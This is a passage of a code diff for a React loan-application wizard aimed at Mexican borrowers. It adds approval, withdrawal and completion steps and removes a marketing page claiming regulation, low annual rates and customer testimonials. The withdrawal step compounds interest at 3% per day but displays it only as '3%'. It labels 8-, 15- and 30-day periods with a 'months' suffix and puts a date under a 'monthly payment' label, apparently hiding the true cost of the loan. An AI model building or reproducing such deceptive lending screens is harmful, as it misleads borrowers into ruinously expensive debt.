+          <div className="text-3xl font-bold text-green-600">
+            ${approvedAmount.toLocaleString()}
+          </div>
+          <div className="text-sm text-green-700">{t('loanWizard.step10.approvedAmountDesc')}</div>
+        </div>
+      </div>
+
+      <div className="space-y-4">
+        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step10.loanConditionsTitle')}</h4>
+          <div className="text-sm text-blue-700 space-y-1">
+            <div>{t('loanWizard.step10.interestRate')}</div>
+            <div>{t('loanWizard.step10.installmentOptions')}</div>
+            <div>{t('loanWizard.step10.noPreFee')}</div>
+            <div>{t('loanWizard.step10.earlyRepayment')}</div>
+          </div>
+        </div>
+
+        <button
+          onClick={() => {
+            const stepData = { approved: true, approvedAmount, approvedAt: Date.now() };
+            if (updateApplicationStep) {
+              updateApplicationStep(10, stepData);
+            }
+            onNext();
+          }}
+          className="w-full px-6 py-4 bg-green-600 text-white rounded-lg hover:bg-green-700 font-medium text-lg"
+        >
+          {t('loanWizard.step10.withdrawNowButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第11步：提现设置
+const Step11Withdrawal: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [withdrawalAmount, setWithdrawalAmount] = useState(data.withdrawalAmount || '');
+  const [installmentPeriod, setInstallmentPeriod] = useState(data.installmentPeriod || 30);
+  const maxAmount = 100000;
+
+  const calculateTotalRepayment = (principal: number, days: number) => {
+    const dailyRate = 0.03; // 3% 日利率
+    const totalRepayment = principal * Math.pow(1 + dailyRate, days);
+    return totalRepayment;
+  };
+
+  const calculateRepaymentDate = (days: number) => {
+    const today = new Date();
+    const repaymentDate = new Date(today.getTime());
+    repaymentDate.setDate(today.getDate() + days);
+    return repaymentDate.toLocaleDateString('es-MX', { 
+      year: 'numeric', 
+      month: 'long', 
+      day: 'numeric' 
+    });
+  };
+
+  const handleNext = () => {
+    const amount = parseFloat(withdrawalAmount.toString());
+    if (!amount || amount <= 0 || amount > maxAmount) {
+      alert(t('errors.invalid'));
+      return;
+    }
+    const stepData = { withdrawalAmount: amount, installmentPeriod };
+    onUpdate(stepData);
+    if (updateApplicationStep) {
+      updateApplicationStep(11, stepData);
+    }
+    onNext();
+  };
+
+  const totalRepayment = withdrawalAmount ? calculateTotalRepayment(parseFloat(withdrawalAmount.toString()), installmentPeriod) : 0;
+  const repaymentDate = withdrawalAmount ? calculateRepaymentDate(installmentPeriod) : '';
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step11.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step11.subtitle')}</p>
+      </div>
+
+      <div className="space-y-6">
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-2">
+            {t('loanWizard.step11.withdrawalAmountLabel')}
+          </label>
+          <input
+            type="number"
+            value={withdrawalAmount}
+            onChange={(e) => setWithdrawalAmount(e.target.value)}
+            placeholder={t('loanWizard.step11.withdrawalAmountPlaceholder')}
+            max={maxAmount.toString()}
+            min="1000"
+            step="100"
+            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg"
+            style={{ maxWidth: "100%" }}
+          />
+          <div className="mt-2 text-sm text-gray-500">
+            {t('loanWizard.step11.withdrawalRangeLabel', { maxAmount: maxAmount.toLocaleString() })}
+          </div>
+        </div>
+
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-2">
+            {t('loanWizard.step11.installmentPeriodLabel')}
+          </label>
+          <div className="grid grid-cols-3 gap-3">
+            {[8, 15, 30].map((period) => (
+              <button
+                key={period}
+                onClick={() => setInstallmentPeriod(period)}
+                className={`p-3 border rounded-lg text-center transition-colors ${installmentPeriod === period
+                  ? 'border-blue-500 bg-blue-50 text-blue-600'
+                  : 'border-gray-300 hover:border-gray-400'
+                  }`}
+              >
+                <div className="font-medium">{period}{t('loanWizard.step11.installmentPeriodSuffix')}</div>
+                <div className="text-sm text-gray-500">{period}{t('loanWizard.step11.installmentMonths')}</div>
+              </button>
+            ))}
+          </div>
+        </div>
+
+        {withdrawalAmount && (
+          <div className="bg-gray-50 rounded-lg p-4">
+            <h4 className="font-semibold mb-3">{t('loanWizard.step11.repaymentPlanTitle')}</h4>
+            <div className="space-y-2 text-sm">
+              <div className="flex justify-between">
+                <span className="text-gray-600">{t('loanWizard.step11.loanAmountLabel')}:</span>
+                <span>${parseFloat(withdrawalAmount.toString()).toLocaleString()}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-600">{t('loanWizard.step11.installmentPeriodLabel')}:</span>
+                <span>{installmentPeriod}{t('loanWizard.step11.installmentPeriodSuffix')}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-600">{t('loanWizard.step11.interestRateLabel')}:</span>
+                <span>3%</span>
+              </div>
+              <hr className="my-2" />
+              <div className="flex justify-between font-medium">
+                <span>{t('loanWizard.step11.monthlyPaymentLabel')}:</span>
+                <span className="text-blue-600">{repaymentDate}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-600">{t('loanWizard.step11.totalRepaymentLabel')}:</span>
+                <span>${totalRepayment.toFixed(2)}</span>
+              </div>
+            </div>
+          </div>
+        )}
+      </div>
+
+      <div className="flex gap-3">
+        <button
+          onClick={onBack}
+          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
+        >
+          {t('loanWizard.step2.backButton')}
+        </button>
+        <button
+          onClick={handleNext}
+          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+        >
+          {t('loanWizard.step2.nextButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第12步：提现完成
+const Step12Complete: React.FC<StepProps> = ({ data, updateApplicationStep }) => {
+  const { t } = useTranslation();
+
+  // 在组件加载时记录完成状态
+  useEffect(() => {
+    const stepData = {
+      completed: true,
+      completedAt: Date.now(),
+      withdrawalAmount: data.withdrawalAmount,
+      installmentPeriod: data.installmentPeriod
+    };
+    if (updateApplicationStep) {
+      updateApplicationStep(12, stepData);
+    }
+    
+    // 追踪贷款申请完成事件
+    if (data.withdrawalAmount) {
+      trackLoanApplicationComplete(data.withdrawalAmount, 'personal');
+    }
+  }, [updateApplicationStep, data.withdrawalAmount, data.installmentPeriod]);
+
+  return (
+    <div className="space-y-6 text-center">
+      <div>
+        <div className="w-20 h-20 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
+          <span className="text-4xl">✅</span>
+        </div>
+        <h3 className="text-2xl font-bold text-green-600 mb-2">{t('loanWizard.step12.successTitle')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step12.successDesc')}</p>
+      </div>
+
+      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
+        <h4 className="font-semibold text-green-800 mb-4">{t('loanWizard.step12.withdrawalDetailsTitle')}</h4>
+        <div className="space-y-3 text-sm">
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step12.withdrawalAmountLabel')}:</span>
+            <span className="font-medium">${data.withdrawalAmount?.toLocaleString()}</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step12.arrivalBankCardLabel')}:</span>
+            <span>****{data.bankCardNumber?.slice(-4)}</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step12.installmentPeriodLabel')}:</span>
+            <span>{data.installmentPeriod}{t('loanWizard.step11.installmentPeriodSuffix')}</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step12.arrivalTimeLabel')}:</span>
+            <span>{t('loanWizard.step12.arrivalTimeValue')}</span>
+          </div>
+        </div>
+      </div>
+
+      <div className="space-y-4">
+        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step12.tipsTitle')}</h4>
+          <ul className="text-sm text-blue-700 space-y-1 text-left">
+            <li>{t('loanWizard.step12.tips1')}</li>
+            <li>{t('loanWizard.step12.tips2')}</li>
+            <li>{t('loanWizard.step12.tips3')}</li>
+            <li>{t('loanWizard.step12.tips4')}</li>
+          </ul>
+        </div>
+
+        <div className="flex gap-3">
+          <button
+            onClick={() => window.location.href = '/user-center'}
+            className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
+          >
+            {t('loanWizard.step12.viewRepaymentPlanButton')}
+          </button>
+          <button
+            onClick={() => window.location.href = '/'}
+            className="flex-1 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+          >
+            {t('loanWizard.step12.returnHomeButton')}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// 主向导组件
+// Main component for the loan application wizard
+const LoanWizard: React.FC = () => {
+  const { t } = useTranslation();
+  const [currentStep, setCurrentStep] = useState(1);
+  const [applicationData, setApplicationData] = useState<LoanApplication>({ step: 1 });
+  const totalSteps = 12;
+
+  // 初始化访客申请
+  useEffect(() => {
+    // 检查浏览器兼容性
+    checkBrowserCompatibility();
+    
+    if (!applicationData.id) {
+      createGuestApplication();
+      // 追踪贷款申请开始事件
+      trackLoanApplicationStart('personal');
+    }
   }, []);
 
-  // 保存应用程序数据到本地存储
-  useEffect(() => {
-    if (applicationData.sessionId) {
-      try {
-        safeStorage.setItem('loanApplication', JSON.stringify(applicationData));
-      } catch (error) {
-        console.warn('Failed to save application data:', error);
-      }
-    }
-  }, [applicationData]);
+  const createGuestApplication = async () => {
+    console.log('=== createGuestApplication called ===');
+    const sessionId = safeStorage.getItem('sessionId') || 'guest-' + Date.now();
+    safeStorage.setItem('sessionId', sessionId);
+    console.log('🔑 Session ID:', sessionId);
 
-  const updateApplicationData = (data: Partial<LoanApplication>) => {
-    setApplicationData(prev => ({ ...prev, ...data }));
+    try {
+      console.log('🚀 Creating guest application...');
+      
+      const result = await httpClient.postJson('/api/applications/guest', {}, {
+        headers: {
+          'X-Session-ID': sessionId
+        }
+      }) as {
+        success: boolean;
+        applicationId: string;
+        sessionId: string;
+        message?: string;
+      };
+
+      console.log('✅ Guest application result:', result);
+
+      const newData = {
+        id: result.applicationId,
+        sessionId: result.sessionId,
+        isGuest: true
+      };
+      console.log('📝 Setting application data:', newData);
+
+      setApplicationData(prev => ({
+        ...prev,
+        ...newData
+      }));
+    } catch (error) {
+      console.error('❌ Failed to create guest application:', error);
+      // 如果创建失败，生成一个临时ID以便继续流程
+      const fallbackData = {
+        id: crypto.randomUUID(),
+        sessionId: sessionId,
+        isGuest: true
+      };
+      setApplicationData(prev => ({
+        ...prev,
+        ...fallbackData
+      }));
+    }
   };
 
   const updateApplicationStep = async (step: number, stepData: any) => {
+    console.log('=== updateApplicationStep called ===');
+    console.log('Step:', step);
+    console.log('StepData:', stepData);
+    console.log('ApplicationData.id:', applicationData.id);
+    console.log('ApplicationData.phone:', applicationData.phone);
+    console.log('ApplicationData.isGuest:', applicationData.isGuest);
+
+    if (!applicationData.id) {
+      console.error('❌ No application ID found!');
+      return;
+    }
+
     try {
-      if (applicationData.id) {
-        await httpClient.put(`/applications/${applicationData.id}`, {
-          step,
-          ...stepData
-        });
-      }
+      const requestBody = {
+        step,
+        data: stepData,
+        phone: applicationData.phone
+      };
+      console.log('📤 Request body:', JSON.stringify(requestBody, null, 2));
+
+      const result = await httpClient.putJson(`/api/applications/${applicationData.id}/step`, requestBody);
+      console.log('✅ Step update result:', result);
     } catch (error) {
-      console.error('Error updating application step:', error);
+      console.error('❌ Failed to update application step:', error);
+      // 不阻断用户流程，允许继续下一步
+    }
+  };
+
+  const updateData = (newData: Partial<LoanApplication>) => {
+    console.log('=== updateData called ===');
+    console.log('Previous applicationData:', applicationData);
+    console.log('New data to merge:', newData);
+
+    setApplicationData(prev => {
+      const updated = { ...prev, ...newData };
+      console.log('Updated applicationData:', updated);
+      return updated;
+    });
+  };
+
+  const nextStep = () => {
+    if (currentStep < totalSteps) {
+      setCurrentStep(currentStep + 1);
+      // 更新申请步骤
+      updateApplicationStep(currentStep + 1, applicationData);
+    }
+  };
+
+  const prevStep = () => {
+    if (currentStep > 1) {
+      setCurrentStep(currentStep - 1);
     }
   };
 
   const renderStep = () => {
     const stepProps = {
       data: applicationData,
-      onUpdate: updateApplicationData,
-      onNext: () => setCurrentStep(prev => Math.min(prev + 1, totalSteps)),
-      onBack: () => setCurrentStep(prev => Math.max(prev - 1, 1)),
+      onUpdate: updateData,
+      onNext: nextStep,
+      onBack: prevStep,
       updateApplicationStep
     };
 
@@ -526,484 +1665,203 @@ const LoanWizardEnhanced: React.FC = () => {
       case 1:
         return <Step1UserRegistration {...stepProps} />;
       case 2:
-        return <Step2PersonalInfo {...stepProps} />;
+        return <Step2Identity {...stepProps} />;
+      case 3:
+        return <Step3IdUpload {...stepProps} />;
+      case 4:
+        return <Step4Contacts {...stepProps} />;
+      case 5:
+        return <Step5LivenessDetection {...stepProps} />;
+      case 6:
+        return <Step6CreditAuthorization {...stepProps} />;
+      case 7:
+        return <Step7BankCard {...stepProps} />;
+      case 8:
+        return <Step8SubmitApplication {...stepProps} />;
+      case 9:
+        return <Step9Processing {...stepProps} />;
+      case 10:
+        return <Step10Approved {...stepProps} />;
+      case 11:
+        return <Step11Withdrawal {...stepProps} />;
+      case 12:
+        return <Step12Complete {...stepProps} />;
       default:
-        return (
-          <div className="p-6 lg:p-8 text-center">
-            <h2 className="text-2xl font-bold text-slate-800 mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-              Paso {currentStep}
-            </h2>
-            <p className="text-slate-600 mb-8">Este paso está en desarrollo.</p>
-            <div className="flex flex-col sm:flex-row justify-between space-y-4 sm:space-y-0 sm:space-x-4">
-              <button
-                onClick={() => setCurrentStep(prev => Math.max(prev - 1, 1))}
-                className="px-6 py-3 border border-slate-300 text-slate-700 font-semibold rounded-sm hover:bg-slate-50 transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
-              >
-                Anterior
-              </button>
-              <button
-                onClick={() => setCurrentStep(prev => Math.min(prev + 1, totalSteps))}
-                className="px-6 py-3 bg-slate-800 hover:bg-slate-700 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
-              >
-                Siguiente
-              </button>
-            </div>
-          </div>
-        );
+        return <div>未知步骤</div>;
     }
   };
 
   return (
-    <div className="bg-gradient-to-br from-slate-50 via-white to-slate-100 min-h-screen">
-      {/* Hero区域 - 信任背书 */}
-      <div className="bg-white border-b border-slate-200">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 lg:py-12">
-          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-12 items-center">
-            {/* 左侧：主要信息 */}
-            <div className="space-y-6">
-              <div>
-                <h1 className="text-3xl lg:text-4xl font-bold text-slate-900 mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                  Préstamos Personales Seguros
-                </h1>
-                <p className="text-lg text-slate-600 leading-relaxed">
-                  Obtén el financiamiento que necesitas con tasas competitivas y proceso 100% digital. 
-                  Regulados por CNBV y con la máxima seguridad en el manejo de tus datos.
-                </p>
-              </div>
-              
-              {/* características principales */}
-              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                <div className="flex items-center space-x-3">
-                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
-                    <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
-                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-                    </svg>
-                  </div>
-                  <span className="text-sm font-medium text-slate-700">Aprobación en 2 minutos</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
-                    <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
-                      <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-                    </svg>
-                  </div>
-                  <span className="text-sm font-medium text-slate-700">Datos 100% seguros</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center">
-                    <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
-                      <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z" />
-                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd" />
-                    </svg>
-                  </div>
-                  <span className="text-sm font-medium text-slate-700">Sin comisiones ocultas</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center">
-                    <svg className="w-4 h-4 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
-                      <path fillRule="evenodd" d="M6 2a1 1 0 00-1 1v1H4a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2h-1V3a1 1 0 10-2 0v1H7V3a1 1 0 00-1-1zm0 5a1 1 0 000 2h8a1 1 0 100-2H6z" clipRule="evenodd" />
-                    </svg>
-                  </div>
-                  <span className="text-sm font-medium text-slate-700">Plazos flexibles</span>
-                </div>
-              </div>
-            </div>
-
-            {/* 右侧：主要图片 */}
-            <div className="space-y-6">
-              {/* 主要展示图片 */}
-              <div className="relative">
-                <img 
-                  src="/images/hero-financial-security.jpg" 
-                  alt="Seguridad Financiera - Préstamos Seguros"
-                  className="w-full h-64 lg:h-80 object-cover rounded-lg shadow-lg"
-                />
-                <div className="absolute inset-0 bg-gradient-to-t from-slate-900/20 to-transparent rounded-lg"></div>
-                <div className="absolute bottom-4 left-4 right-4">
-                  <div className="bg-white/90 backdrop-blur-sm rounded-lg p-4">
-                    <h3 className="font-semibold text-slate-800 text-sm mb-2">Proceso 100% Digital</h3>
-                    <p className="text-xs text-slate-600">Solicita desde la comodidad de tu hogar</p>
-                  </div>
-                </div>
-              </div>
-
-              {/* 认证徽章 */}
-              <div className="grid grid-cols-2 gap-4">
-                <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 text-center">
-                  <img 
-                    src="/images/cnbv-logo.png" 
-                    alt="CNBV Regulado"
-                    className="w-12 h-12 mx-auto mb-3 object-contain"
-                  />
-                  <h3 className="font-semibold text-slate-800 text-sm mb-1">CNBV</h3>
-                  <p className="text-xs text-slate-600">Regulado</p>
-                </div>
-                <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 text-center">
-                  <img 
-                    src="/images/ssl-security.png" 
-                    alt="SSL 256-bit Security"
-                    className="w-12 h-12 mx-auto mb-3 object-contain"
-                  />
-                  <h3 className="font-semibold text-slate-800 text-sm mb-1">SSL</h3>
-                  <p className="text-xs text-slate-600">256-bit</p>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      {/* 进度条区域 */}
-      <div className="bg-white border-b border-slate-200 shadow-sm">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 lg:py-6">
-          <div className="flex items-center justify-between mb-3">
-            <div className="flex items-center space-x-3">
-              <h2 className="text-lg lg:text-xl font-bold text-slate-800 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                Solicitud de Préstamo
-              </h2>
-              <div className="hidden lg:flex items-center space-x-2 text-sm text-slate-600">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
-                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-                </svg>
-                <span>Proceso seguro y encriptado</span>
-              </div>
-            </div>
-            <div className="text-right">
-              <div className="text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
-                Paso {currentStep} de {totalSteps}
-              </div>
-              <div className="text-xs text-slate-500">
-                {Math.round((currentStep / totalSteps) * 100)}% completado
-              </div>
-            </div>
-          </div>
-          
-          {/* 进度条 */}
-          <div className="w-full bg-slate-200 rounded-full h-2">
-            <div
-              className="bg-gradient-to-r from-slate-700 to-slate-800 h-2 rounded-full transition-all duration-500 ease-out"
-              style={{ width: `${(currentStep / totalSteps) * 100}%` }}
-            ></div>
-          </div>
-        </div>
-      </div>
-
-      {/* 主内容区域 */}
-      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8">
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
-          {/* 左侧：表单内容 */}
-          <div className="lg:col-span-2 space-y-8">
-            <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden max-w-2xl">
-              {renderStep()}
-            </div>
-
-            {/* 表单下方的信任内容区域 */}
-            <div className="space-y-8 max-w-2xl">
-              {/* 流程说明 */}
-              <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
-                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                  Proceso Simple en 3 Pasos
-                </h3>
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-                  <div className="text-center">
-                    <div className="relative mb-4">
-                      <img 
-                        src="/images/step-1-phone.jpg" 
-                        alt="Paso 1: Verificación telefónica"
-                        className="w-20 h-20 mx-auto rounded-full object-cover shadow-md"
-                      />
-                      <div className="absolute -top-2 -right-2 w-8 h-8 bg-slate-800 text-white rounded-full flex items-center justify-center text-sm font-bold">
-                        1
-                      </div>
-                    </div>
-                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Verificación</h4>
-                    <p className="text-xs text-slate-600">Ingresa tu teléfono y verifica tu elegibilidad</p>
-                  </div>
-                  <div className="text-center">
-                    <div className="relative mb-4">
-                      <img 
-                        src="/images/step-2-form.jpg" 
-                        alt="Paso 2: Completar información"
-                        className="w-20 h-20 mx-auto rounded-full object-cover shadow-md"
-                      />
-                      <div className="absolute -top-2 -right-2 w-8 h-8 bg-slate-800 text-white rounded-full flex items-center justify-center text-sm font-bold">
-                        2
-                      </div>
-                    </div>
-                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Información</h4>
-                    <p className="text-xs text-slate-600">Completa tus datos personales y financieros</p>
-                  </div>
-                  <div className="text-center">
-                    <div className="relative mb-4">
-                      <img 
-                        src="/images/step-3-approval.jpg" 
-                        alt="Paso 3: Aprobación y desembolso"
-                        className="w-20 h-20 mx-auto rounded-full object-cover shadow-md"
-                      />
-                      <div className="absolute -top-2 -right-2 w-8 h-8 bg-slate-800 text-white rounded-full flex items-center justify-center text-sm font-bold">
-                        3
-                      </div>
-                    </div>
-                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Aprobación</h4>
-                    <p className="text-xs text-slate-600">Recibe tu dinero en minutos</p>
-                  </div>
-                </div>
-              </div>
-
-              {/* beneficios con imágenes */}
-              <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
-                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                  Beneficios Exclusivos
-                </h3>
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                  <div className="flex items-start space-x-4">
-                    <img 
-                      src="/images/benefit-fast-approval.jpg" 
-                      alt="Aprobación Rápida"
-                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
-                    />
-                    <div>
-                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Aprobación Instantánea</h4>
-                      <p className="text-xs text-slate-600">Respuesta automática en menos de 2 minutos usando tecnología avanzada de análisis crediticio.</p>
-                    </div>
-                  </div>
-                  <div className="flex items-start space-x-4">
-                    <img 
-                      src="/images/benefit-low-rates.jpg" 
-                      alt="Tasas Bajas"
-                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
-                    />
-                    <div>
-                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Tasas Competitivas</h4>
-                      <p className="text-xs text-slate-600">Desde 12% anual, las mejores tasas del mercado sin comisiones por apertura.</p>
-                    </div>
-                  </div>
-                  <div className="flex items-start space-x-4">
-                    <img 
-                      src="/images/benefit-flexible-terms.jpg" 
-                      alt="Plazos Flexibles"
-                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
-                    />
-                    <div>
-                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Plazos Flexibles</h4>
-                      <p className="text-xs text-slate-600">Elige el plazo que mejor se adapte a tu capacidad de pago, de 6 a 36 meses.</p>
-                    </div>
-                  </div>
-                  <div className="flex items-start space-x-4">
-                    <img 
-                      src="/images/benefit-24-7-support.jpg" 
-                      alt="Soporte 24/7"
-                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
-                    />
-                    <div>
-                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Soporte Especializado</h4>
-                      <p className="text-xs text-slate-600">Equipo de atención al cliente disponible 24/7 para resolver todas tus dudas.</p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-
-              {/* Testimonios con fotos */}
-              <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
-                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                  Testimonios de Clientes Reales
-                </h3>
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                  <div className="bg-slate-50 rounded-lg p-4">
-                    <div className="flex items-start space-x-4 mb-4">
-                      <img 
-                        src="/images/testimonial-maria.jpg" 
-                        alt="María González - Cliente satisfecha"
-                        className="w-12 h-12 rounded-full object-cover shadow-sm"
-                      />
-                      <div>
-                        <h4 className="font-semibold text-slate-800 text-sm">María González</h4>
-                        <div className="flex text-yellow-400 text-sm">
-                          {'★'.repeat(5)}
-                        </div>
-                      </div>
-                    </div>
-                    <p className="text-sm text-slate-600 italic">
-                      "Increíble lo rápido que fue todo el proceso. En menos de 30 minutos tenía el dinero en mi cuenta. 
-                      El equipo de soporte fue muy profesional y me explicaron todo claramente."
-                    </p>
-                  </div>
-                  <div className="bg-slate-50 rounded-lg p-4">
-                    <div className="flex items-start space-x-4 mb-4">
-                      <img 
-                        src="/images/testimonial-carlos.jpg" 
-                        alt="Carlos Rodríguez - Cliente satisfecho"
-                        className="w-12 h-12 rounded-full object-cover shadow-sm"
-                      />
-                      <div>
-                        <h4 className="font-semibold text-slate-800 text-sm">Carlos Rodríguez</h4>
-                        <div className="flex text-yellow-400 text-sm">
-                          {'★'.repeat(5)}
-                        </div>
-                      </div>
-                    </div>
-                    <p className="text-sm text-slate-600 italic">
-                      "Las tasas son realmente competitivas y no hay sorpresas. Todo está muy claro desde el inicio. 
-                      Definitivamente recomiendo este servicio a cualquiera que necesite financiamiento."
-                    </p>
-                  </div>
-                </div>
-              </div>
-
-              {/* Seguridad y regulación */}
-              <div className="bg-gradient-to-r from-slate-50 to-slate-100 rounded-lg border border-slate-200 p-6">
-                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                  Máxima Seguridad y Regulación
-                </h3>
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-                  <div className="text-center">
-                    <img 
-                      src="/images/security-encryption.jpg" 
-                      alt="Encriptación de datos"
-                      className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md mb-4"
-                    />
-                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Encriptación SSL</h4>
-                    <p className="text-xs text-slate-600">Todos tus datos están protegidos con encriptación de nivel bancario SSL 256-bit.</p>
-                  </div>
-                  <div className="text-center">
-                    <img 
-                      src="/images/regulation-cnbv.jpg" 
-                      alt="Regulación CNBV"
-                      className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md mb-4"
-                    />
-                    <h4 className="font-semibold text-slate-800 text-sm mb-2">CNBV Regulado</h4>
-                    <p className="text-xs text-slate-600">Autorizados y supervisados por la Comisión Nacional Bancaria y de Valores.</p>
-                  </div>
-                  <div className="text-center">
-                    <img 
-                      src="/images/privacy-protection.jpg" 
-                      alt="Protección de privacidad"
-                      className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md mb-4"
-                    />
-                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Privacidad Total</h4>
